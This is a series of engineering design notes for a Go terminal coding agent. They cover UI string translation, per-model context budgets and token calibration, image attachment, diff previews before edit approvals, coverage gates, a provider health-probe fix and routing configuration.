An inventory found **231 user-facing pt-BR/mixed strings across 16 files**
(accounts and the setup wizard the heaviest). Every one was translated to
idiomatic English and **centralized**: each area now has a companion
`*_text.go` file (`wizard_text.go`, `accounts_text.go`, …) holding its
strings as named `const`s grouped with explanatory comments, and the source
files reference those consts instead of scattered literals. This is the
issue's "um const por área" — the extension point if real i18n is ever
wanted, and the single place to review copy for consistency. Deliberately
**not** built: an i18n framework (plurals, locales, ICU) — over-engineering
for a solo TUI; a string table in one language is what the problem needed.

Format verbs (`%s`/`%d`/`%w`), lipgloss/ANSI markup, glyphs (↑↓ · … — ✓ ●),
key names, command literals (`rm -rf`, `git push`, `config.yaml`), and the
leading/trailing spaces callers concatenate onto were all preserved exactly;
the intentional all-lowercase register of footer/hint lines was kept. Recurring
hints ("↑↓ choose · enter confirm", "error: ", "esc back") use one canonical
English wording so screens can't drift apart. Left out of scope: pt-BR code
comments, and test-fixture strings representing user-typed input (e.g. a
sample prompt) — neither is a UI string.

Verification took the migration's scale seriously. The translate-and-
centralize pass and the follow-up updates to the ~13 test files whose golden
assertions pinned the old pt-BR were each fanned out across disjoint files
(no shared-file collisions except one duplicate route-attempt const, merged
by hand). Then an adversarial **semantic-fidelity** pass compared every
original pt-BR against its applied English for meaning drift, broken
interpolation, lost glyphs, and inconsistent terms — zero findings. Final
gate: `go vet` clean (catches any Printf verb/arg mismatch), the full
`go test ./... -race` green, and a repo-wide sweep confirming no pt-BR
remains in any user-facing UI string.

---

## Per-model context budget + image token cost (post-audit #70, parts 1 & 2)

Two context-budget defects the audit found, both in `internal/daemon/compaction`:

**60K hardcoded, no entrypoint.** `DefaultMaxTokens = 60_000` was the effective
budget for every deployment — `agent.Config.MaxContextTokens` fell to it and no
flag or config field exposed it. So a small local model (8K–32K window)
overflowed its real window every turn *without compaction ever firing* (the
trigger only acts above 60K → the provider rejects or silently truncates),
while a big hosted model (200K+) compacted at a third of its window, throwing
away useful context. Same shape as `PreferStreaming` before #57: a reasonable
default that had to become configurable once it met real hardware.

The fix threads a real per-model window through the layers. `ContextWindow`
was added to `providercatalog.Provider` (with conservative per-model defaults),
`config.ProviderConfig` (`context_window` in config.yaml), and
`customprovider.Provider` (optional, collected by a new field on the
custom-provider form — the case that matters most, since a local server is
exactly where the window is small and unknown to Kram). `config.Config.
ComboContextWindow` takes the **minimum** window across a combo's providers —
the right aggregate, because a fallback chain can route to any of them, so the
budget must fit the smallest or a fallback would overflow it — ignoring
providers whose window is unknown (0). `cmd/kram.resolveMaxContextTokens`
resolves the daemon's budget: an explicit `--max-context-tokens` override wins,
else the active combo's min window, else the `default_combo`'s, else 0 (which
the agent turns back into `DefaultMaxTokens`, preserving today's behavior when
nothing is known). This mirrors #76's timeout wiring — `cmd/kram` holds both
the gateway config and the `daemon.Config` it builds, so it's the one place
that can compute a combo-derived value and hand it to the daemon. Since
`MaxContextTokens` is the *full* window and `contextpolicy` already subtracts
the fixed prompt/tool cost and the response reserve, no other arithmetic
changed.

**Images cost zero.** `EstimateTokens` summed content + tool-call chars but
ignored `store.Message.Images` entirely — yet images are base64 data URLs
resent to the provider every turn and never pruned, each really costing
hundreds to a couple thousand tokens. A session with a few images overflowed
the real window long before Kram thought it needed to compact. `EstimateTokens`
now adds a flat `imageTokenEstimate` (1200) per image — deliberately *not*
`len(base64)`, which would wildly overcount, and deliberately on the higher
side (overestimating fires compaction a little early, far safer than a silent
overflow). Because both the compaction trigger and the context-usage panel
share this one function, they stay in agreement automatically.

Deliberately deferred to a focused follow-up (part 3 of the issue):
**calibrating the `chars/4` estimate against the gateway's real
`usage.prompt_tokens`.** The gateway already returns it on every response; the
idea is to correct the estimate toward the model's actual tokenizer. It's a
*stateful runtime feedback loop* (a bad ratio would skew compaction timing in
either direction), so it warrants its own change with isolated tests rather
than riding along with this static plumbing. Parts 1 & 2 already deliver the
bulk of the value — a correct per-model ceiling and images that finally count.

Tests pin each link: `EstimateTokens` counts images (and ignores base64 size),
`ComboContextWindow` takes the min ignoring unknowns, `resolveMaxContextTokens`
honors the override and the combo/default_combo fallback chain, the custom
provider's window round-trips through save/reload (and clamps negatives), and
`parseContextWindowInput` treats blank/garbage/negative as "unknown" without
crashing. An adversarial review (budget wiring end-to-end, and the estimator /
form-index integration, including a deliberate check for small-window
compaction thrash) returned zero findings.

---

## Calibrating the token estimate with real prompt_tokens (post-audit #70, part 3)

Parts 1 & 2 gave the budget a correct per-model *ceiling* and made images
count. This closes the loop on the *estimate* itself: `chars/4` is
systematically off — usually an underestimate for code, which tokenizes
denser than prose — so the budget check could fire late relative to the
model's real window even with the ceiling right. The gateway already returns
the real `prompt_tokens` on every response (today only surfaced in the
context icon); the audit's cheap alternative to a real per-provider tokenizer
was to feed that back into the estimate.

`internal/daemon/agent.tokenCalibrator` stores a per-session multiplier.
After each successful call, `observe(sessionID, rawEstimate, realTokens)`
records `real / estimate`, EMA-smoothed (weight 0.5, so a one-off outlier
doesn't whipsaw) and clamped to `[0.5, 3.0]` (a garbage usage report can't
break budgeting). Later budget checks multiply their `chars/4` estimates by
`factor(sessionID)` (1.0 until the first response, so a session's first turn
is unchanged). Direction: when the model tokenizes denser than the estimate,
factor > 1, the scaled estimate rises, and compaction fires *sooner* — the
correct direction, since we were underestimating.

Two subtleties the design got right, both confirmed by adversarial review:
- **The estimate/usage pairing.** `observe` is called inside
  `callModelWithRetry` on the *first successful round*, using that call's own
  `result.Usage.PromptTokens` **before** it's summed with any failed rounds'
  usage — summing would double-count the prompt across retries and corrupt
  the ratio. The paired `sentEstimate` is computed in `runLoop` as
  `EstimateTokens(effective) + fixedTokens` *after* any prune, i.e. a faithful
  raw estimate of exactly what went on the wire (history + fixed preamble +
  tool defs, images included).
- **Panel/trigger consistency.** `context_usage.go` scales the same figures by
  the same factor (leaving the real-window `Budget` unscaled), preserving its
  standing invariant that the context panel and the compaction trigger never
  disagree.

The per-session map is bounded (LRU, 256 entries) exactly like
`router.stickyStore` — a daemon serving thousands of short-lived sessions
over its lifetime can't grow it without limit; an evicted session simply
re-learns its factor from its next response. (This was the one finding of the
part-3 adversarial review — a slow unbounded-map leak — fixed by adopting the
established in-repo bounded-LRU convention rather than leaving it.) The
calibrator is nil-safe, so a `Service` built directly in a test behaves
exactly as before calibration existed. Tests pin the learned ratio,
EMA smoothing, clamping, non-positive/​nil inputs, the LRU bound (a
continuously-used session survives eviction), and the full end-to-end loop
through a mock gateway (a 150/100 response teaches a 1.5× factor).

---

## Activating image input in the composer (post-audit #71)

The README advertised image input and the whole stack already carried it —
`daemonclient.SendMessageStream` takes `images`, the daemon forwards them, the
agent loop capability-gates them (emitting `imageNotice` when no provider in
the combo accepts images), and the provider adapters decode data URLs. The one
gap: the composer's send path passed `nil` for images (`commands.go`), so an
advertised feature was unreachable — worse than absent, because it breaks
trust. This was pure TUI wiring, no backend change.

`/image <path>` stages an image for the next message (a leading `~` is
expanded). A path was chosen over clipboard-image paste because most
terminals can't hand a TUI raw image bytes, and over auto-detecting a path in
message text because that would misfire on ordinary prose mentioning a
filename — an explicit command is unambiguous and discoverable. Staged files
show above the composer and, once sent, as a 📎 row under the user message;
the queue clears on send. An image-only message (staged image, no text) is
allowed. Decoding to base64 data URLs happens *off* the Update loop, inside
the send `tea.Cmd`, so reading a multi-MB file never blocks a keystroke; a
file that can't be read at send time fails the whole send with a clear error
rather than silently dropping the attachment. A 20 MiB cap bounds the
worst case (images are history — resent every turn, and now counted by the
budget thanks to #70).

**The content check must sniff bytes, not trust the extension** — the fix for
the one substantive finding of this change's adversarial review. The first cut
resolved MIME from the file extension for known image suffixes, so a text file
renamed `foo.png` sailed past the "is it really an image" guard and shipped
base64 garbage to the model. Both `stageImageForAttachment` (reading only the
leading 512 bytes, cheap enough for the keystroke) and `imageFileToDataURL`
(defense in depth at send time) now run `http.DetectContentType` on the actual
bytes and reject anything that isn't `image/*`. The review also caught that the
test purporting to cover this case asserted nothing on it; it now asserts the
mislabeled file is rejected. Deliberately left as-is: on a send-time read
failure the optimistic user message stays in the transcript — the same
phantom-message behavior text-only sends already have, not worth diverging
here. Tests cover the helpers (valid image, blank/missing/dir/oversize/
mislabeled, `~` expansion, MIME by sniff) and the full composer flow (stage
without sending, bad path errors without staging, send attaches and clears,
image-only send). README's composer section documents the command (and its
stale pt-BR activity labels from #74 were corrected in the same pass).

---

## A unified diff before approving an edit (post-audit #67)

The central trust gap of a coding agent: when policy marks an `edit_file`/
`write_file` as `Ask`, the prompt showed only `tool: path` — the user
approved a change **without ever seeing what would change**, and a blind
"always" persisted a per-path grant. That friction pushes people to
autonomous mode (approve everything), the worst security outcome. Every
2026 peer (Claude Code, Codex, opencode) shows a unified diff first. This
adds one.

**Diff computed at the tool layer, before applying.** A new
`internal/daemon/tools.diffForToolCall(workspace, name, args)` produces the
would-be-new content *in memory* and returns a git-style unified diff,
mirroring each tool's own apply logic exactly so the preview matches what
the subsequent `Execute` does: for `edit_file`, the same
`strings.Count`/`Replace`/`ReplaceAll` and the same count==0 /
count>1&&!replace_all "no clean apply → no preview" cases; for `write_file`,
the current content (or `/dev/null` for a created file) vs the new. It reuses
the tools' own `resolvePath` (so the preview targets the same file the apply
will), and returns `""` — falling back to the old path-only prompt — for a
non-diffable tool, a workspace escape, a binary or >256 KiB file, or no net
change. Diffing is via `go-udiff` (gopls' Myers diff, already transitively
vendored — promoted to a direct dep, zero new transitive deps). The
adversarial review's diff-fidelity pass — the property that matters most,
since a preview that disagrees with the apply is worse than none — found
nothing.

**Threaded through as data, not re-derived.** `Approver.Approve` gained a
`diff` param; it rides `agent.Event.ApprovalDiff` → the SSE `"diff"` field
→ `daemonclient.StreamEvent.Diff` → the TUI. The decision comes back on the
same `{approval_id, decision}` POST, unchanged. Headless `--json` emits the
diff for free (the whole `StreamEvent` is encoded). Subagents (nil event
sink) still deny immediately — they never surface an approval to compute a
diff for that matters.

**TUI: a scrollable colored diff.** `renderApproval` shows the diff in a
`bubbles/viewport` sized to the diff and capped at 16 rows (so a large edit
scrolls in place — pgup/pgdn/home/end — instead of pushing the
once/always/deny buttons off screen; a small edit reserves only the rows it
needs). `colorizeUnifiedDiff` classifies each line by *position*, not prefix
width: only the `---`/`+++` file headers before the first `@@` are headers,
and inside a hunk a line is add/del by its single leading character — so a
deleted `--i;` (emitted as `---i;`) colors red, not as a header (the
review's one substantive TUI finding, fixed with a `classifyDiffLine`
helper that's unit-tested on exactly that case).

**Grant semantics: per-path, made honest.** "always" still persists a
per-path grant (`grants.go` unchanged — its exact-subject design is
deliberate, and per-content would re-ask on every whitespace change). The
fix is the copy: for a file tool, the "always" option now reads "allow all
future edits to <path>", so the user knows they're whitelisting the file,
not just this diff. The decision string sent on Enter stays the literal
`"always"` — only the displayed label is decorated.

Tests cover the fidelity of `diffForToolCall` against each apply path
(edit/overwrite/create/not-found/ambiguous/replace_all/binary/escape/
identical), the SSE round-trip of the diff field, the line classifier
(including the `--`/`++` trap), viewport sizing (small vs capped), the
"always" copy, and that a diffless approval renders exactly as before.

---

## Per-package coverage gate (post-audit #77)

`scripts/verify.sh` enforced a single **90% global** coverage floor. The audit
found the incentive it created was wrong: for `internal/cli/app`, where most
lines are rendering, the cheapest way to defend a high global number is
trivial `View() != ""`-style asserts, not tests that catch a regression —
whole files (`coverage_expansion_test.go`) exist partly to feed the gate. A
uniform global number rewards coverage-chasing exactly where meaningful
assertions are hardest.

The gate is now **per-package, tiered**:
- **90%** — core business logic (`daemon/agent`, `router`, `permission`,
  `provider`, `daemon/compaction`, `breaker`, `config`, `daemon/contextpolicy`,
  `gateway`). This is a real strength of the project and the audit was explicit
  it must *not* drop.
- **70%** — `internal/cli/app`. Rendering-dominated; the bar rewards
  behavioral tests (content/output assertions) instead of trivial ones written
  only for the number. Coverage there is currently 90.3% — the lower floor
  simply means a legitimate trivial-assert cleanup no longer *fails the build*,
  removing the perverse incentive rather than mandating deletions (the audit
  cautioned against gutting TUI coverage).
- **60%** — `internal/localstore`. A thin atomic-write helper whose remaining
  uncovered lines are defensive fs-error branches (fsync/rename failure)
  untriggerable portably; forcing them would be the very coverage-chasing this
  change removes.
- **80%** — everything else (the default floor).

The computation reduces the coverage profile to per-package `covered/total`
with awk, resolves each package's floor with a `case`, and compares with
integer arithmetic (`covered*100 >= threshold*total`, no float rounding),
printing a per-package table plus an overall figure. Verified both ways: it
passes on the current tree and, in a negative test, correctly flags a package
held to an unmet floor. `verify.sh` runs green end to end.

Deliberately *not* done: a purge of "coverage-chasing" tests. Inspection found
the naked `View() != ""` anti-pattern isn't actually widespread — the
`!= ""` assertions that exist are behavioral (empty-input → empty-output), and
`coverage_expansion_test.go` now holds real interaction tests. Removing them
would strip genuine coverage for little gain, against the issue's own caution.
Fixing the *incentive* (the gate) is the structural remedy; individual trivial
asserts can now be improved case by case without the gate punishing honest
removals. Two genuinely-undertested error paths were filled while here:
`localstore.AtomicWrite`'s MkdirAll-on-a-file and temp-open failures
(48%→64%), and `onboarding.Load`'s corrupt-file rejection (77.8%→81.5%) —
real behavioral tests, not number-padding.

---

## The ChatGPT-login health dot: a 400 means auth passed, not "down"

The accounts screen pinged a connected `openai-chatgpt` (Codex) account red even
though the login worked and real completions streamed fine. Diagnosed live
against a real ChatGPT subscription: the token authenticates correctly, but the
`openai-responses` probe deliberately sends a minimal, incomplete body (empty
`input`, no `store` flag), and the Codex backend — which validates auth *before*
body shape — always rejects it with a body-validation **400** ("Store must be
set to false", then "input required"). `providerping.Ping` classified every
`>= 400` as `StatusDown`, so that healthy-signal 400 showed as a red "HTTP 400"
dot. An invalid token, by contrast, returns **401** ("Could not parse your
authentication token"), which the probe already caught.

So for the `openai-responses` kind specifically, a 4xx that isn't 401/403/429
now reads as reachable (`StatusOK`): reaching a body-validation error is proof
that auth succeeded and the backend is up — the only thing this probe can
confirm short of a real, quota-consuming completion. This matches the probe's
own long-standing comment ("a 401/403 still reads as invalid key, anything else
as reachable"), which the generic `>= 400` branch had been silently
contradicting. The alternative — sending a valid completion to turn the dot
green — was rejected: a health check must not spend the user's ChatGPT quota.

Fixed in passing: `internal/providerping/ping.go` still carried Brazilian-
Portuguese `Detail` strings the #74 sweep missed (it only covered
`internal/cli/app`), even though these surface in the accounts screen next to
the dot. Translated to English alongside the fix.

---

## In-app routing config: strategies that auto-align to the providers you have

The `priority` strategy kept erratically dialing a dead local-lab provider even
for a user who only had one real account connected. The root cause was
structural, not a bug in `priority`: routing strategy was decided once, at
autodetect time, from a rule (`havePaid`) that had nothing to do with *how many*
providers were actually configured — and once chosen it was invisible and
unchangeable from inside the running app. A single-provider setup has no routing
decision to make, yet it was still being funneled through a multi-provider
strategy that assumed a fallback chain existed.

Three things changed, in one PR because they're one idea (routing should follow
the providers you actually have, and you should be able to steer it live):

**1 — Autodetected strategy follows provider count, not a paid/free flag.**
`gatewayconfig.autoStrategy` now returns `""` (declared-order, the coherent
"there's nothing to balance" default) for a single provider and `smart` for two
or more. `smart` is the right multi-provider default — it balances health,
quality, latency and affinity — and there's no reason a lone provider should
pay for any of that machinery. The old `havePaid` heuristic is gone.

**2 — The daemon has a live "active combo", switchable per session.**
The combo the daemon routes through was previously fixed at boot
(`daemon.Config.Model`). It's now a guarded, mutable field (`activeCombo`) with
a `POST /combo` endpoint and a `SetActiveCombo` that validates the target
against the gateway's own combo list before switching. This is what lets a
single-provider setup "fall into" its combo while a multi-provider one picks a
different combo without a restart — and it's plumbed through the run so a
subtask inherits the run's active model via context (`tools.WithRunModel`),
not a stale boot-time constant.

**3 — Ctrl+S is now a two-level routing panel, and saves persist.**
The old Ctrl+S opened a flat strategy picker for whatever combo happened to be
active. It now opens on a **combo level** (pick which combo future messages
route through — each row shows its provider count and current strategy) and only
advances to the **strategy level** for a combo that actually fans across two or
more providers; a single-provider combo has no routing to configure, so the
panel says so and just confirms the switch. On the strategy level, Enter applies
at runtime (ephemeral, as before) and Ctrl+S *saves* — persisting the strategy
to `config.yaml` and making that combo the config's `default_combo`, so the
choice survives a restart. Persistence goes through a new `persist`/`make_default`
pair on `POST /admin/strategy`; the gateway writes membership from its live
config (never the sanitized router view, so a provider that failed to build this
boot isn't silently dropped from the file) and restores the on-disk host/port so
a persisted save can't clobber the file's real port with the ephemeral runtime
one. A gateway with no on-disk config (pure-autodetect) returns 503 rather than
pretending to save.

Closing the loop: `loadOrDetectGatewayConfig` now also returns the *persist
path* — the exact file each config tier was loaded from (explicit, workspace,
global), or the global path for the fileless autodetect tier so a first save has
somewhere to land — and `cmd/kram` lets the config's `default_combo` choose the
active combo unless `-model` was passed explicitly. So a combo saved as default
in one session is the active combo the next time kram boots, with no flag.

Reusing Ctrl+S as "save" on the strategy level (rather than a new key) is
deliberate: a plain letter would also type into the still-focused composer,
whereas Ctrl+S is already intercepted, and "open the panel, drill in, press the
same key to commit" is the muscle-memory the shortcut already trains. Esc steps
back a level before it closes, so the two levels feel like one panel, not two.
